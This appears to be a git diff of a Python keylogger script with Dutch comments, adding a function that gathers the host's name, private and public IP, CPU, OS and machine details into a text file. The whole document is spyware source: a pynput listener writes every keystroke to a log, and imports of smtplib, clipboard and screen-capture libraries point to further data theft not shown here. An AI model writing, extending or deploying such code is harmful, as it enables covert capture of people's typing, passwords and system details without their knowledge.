@@ -8,7 +8,7 @@ import smtplib
 import socket
 import platform
 import win32clipboard
-from pynput.keyboard import Key,Listener
+from pynput.keyboard import Key, Listener
 import time
 import os
 import getpass
@@ -17,19 +17,24 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 from pathlib import Path
 
-#Variabelen keylogger
+# Variabelen keylogger
 
 key_log = "key_log.txt"
 path_directory = Path(__file__)
 path_keylog = str(path_directory).replace("main.py", "key_log.txt")
 path_keylog_formatted = re.escape(str(path_keylog))
-print(path_keylog_formatted)
 
 count = 0
 keys = []
 
+# Variabelen voor systeeminformatie
+sytem_info = "systeminfo.txt"
+path_system = str(path_directory).replace("main.py", "systeminfo.txt")
+path_system_formatted = re.escape(str(path_system))
+print(path_system_formatted)
 
-#Functies keylogger
+
+# Functies keylogger
 
 def on_press(key):
     global count, keys
@@ -40,9 +45,11 @@ def on_press(key):
         write_log(keys)
         keys = []
 
+
 def on_release(key):
     if key == Key.esc:
         return False
+
 
 def write_log(keys):
     with open(path_keylog, "a") as f:
@@ -55,5 +62,26 @@ def write_log(keys):
                 f.write(k)
                 f.close()
 
+
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
+
+# Functies systeeminfo
+
+def system_info():
+    with open(path_system, "a") as f:
+        hostname = socket.gethostname()
+        IP = socket.gethostbyname(hostname)
+        try:
+            public_IP = get("https://api.apify.org").text
+            f.write("Public IP: " + public_IP)
+        except Exception:
+            f.write("Kon public IP adres niet ophalen.")
+        f.write("CPU Info: " + (platform.processor()) + "\n")
+        f.write("OS info: " + platform.system() + " " + platform.version() + "\n")
+        f.write("Machine info: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP: " + IP + "\n")
+
+system_info()
